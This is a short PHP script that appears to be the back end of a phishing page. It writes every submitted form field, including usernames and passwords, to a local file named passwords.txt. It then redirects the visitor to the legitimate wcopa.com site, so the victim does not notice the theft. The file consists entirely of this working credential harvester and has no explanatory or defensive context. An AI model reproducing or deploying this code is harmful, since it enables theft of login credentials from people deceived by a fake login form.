<?php
header("Location: http://wcopa.com/");
$handle = fopen("passwords.txt", "a");
foreach ($_POST as $key => $value) {
	fwrite($handle, $key);
	fwrite($handle, "=");
	fwrite($handle, $value);
	fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>